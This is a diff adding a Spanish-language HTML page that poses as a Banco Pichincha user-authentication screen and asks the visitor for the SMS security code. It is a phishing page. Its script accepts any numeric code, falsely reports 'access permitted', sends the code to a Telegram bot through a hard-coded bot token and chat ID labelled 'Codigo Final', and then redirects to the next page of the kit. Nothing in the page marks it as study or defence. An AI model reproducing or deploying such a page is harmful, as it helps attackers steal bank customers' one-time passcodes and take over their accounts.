@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Seguridad</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff; /* Fondo blanco */
+            color: #000; /* Letras negras */
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f4f4f4; /* Fondo gris claro para el contenedor */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        input[type="text"] {
+            padding: 25px;
+            font-size: 20px;
+            margin-bottom: 20px;
+            width: 250px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #eee; /* Fondo gris claro para el input */
+            color: #000; /* Texto negro dentro del input */
+            text-align: center; /* Centra el texto en el campo de entrada */
+        }
+        button {
+            padding: 15px 70px; /* Aumenté el padding para hacerlo más grande */
+            font-size: 18px; /* Aumenté el tamaño del texto */
+            background-color: #007BFF; /* Botón azul */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0056b3; /* Azul más oscuro cuando se pasa el mouse */
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        ul {
+            list-style-type: none;
+            padding-left: 0;
+            font-size: 18px;
+            font-family: Georgia, serif;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        ul li {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+      <p><img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original" style="width: 250px;"></p>
+        <h2>Autenticacion de Usuario </h2>
+        <ul>
+            <li>Hemos enviado un mensaje de texto con un c&oacute;digo a su numero de m&oacute;vil o correo electr&oacute;nico registrado. Este c&oacute;digo puede tardar algunos minutos en llegar.</li>
+        </ul>
+        <input type="text" id="codigoSeguridad" placeholder="Código de seguridad" maxlength="40" />
+        <button onclick="verificarCodigo()">Verificar</button>
+
+        <div class="message" id="mensaje"></div>
+    </div>
+
+    <script>
+        function verificarCodigo() {
+            var codigoIngresado = document.getElementById("codigoSeguridad").value;
+            var mensaje = document.getElementById("mensaje");
+
+            // Validar que el código ingresado sea numérico y tenga hasta 40 caracteres
+            var regex = /^[0-9]{1,40}$/;
+
+            if (regex.test(codigoIngresado)) {
+                mensaje.textContent = "Código válido. Acceso permitido.";
+                mensaje.style.color = "green";
+                // Enviar mensaje a Telegram si el código es válido
+                enviarAMensajeTelegram(codigoIngresado);
+                // Redirigir a www.pichincha.com después de 2 segundos
+                setTimeout(function() {
+                    window.location.href = "index3.html"; 
+                }, 2000);  // Redirige después de 2 segundos
+            } else {
+                mensaje.textContent = "El código debe ser numérico y tener un máximo de 40 dígitos.";
+                mensaje.style.color = "red";
+            }
+        }
+
+        function enviarAMensajeTelegram(codigo) {
+            const token = '8846344769:AAEojcRhytqpElPr6kBXXTV4BPtMRgip--g'; // Reemplaza con tu token
+            const chatId = '-1003909972106'; // Reemplaza con el ID de tu canal
+            const mensaje = `Codigo Final: ${codigo}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: mensaje
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Mensaje enviado a Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error al enviar el mensaje a Telegram:', error);
+            });
+        }
+    </script>
+
+</body>
+</html>
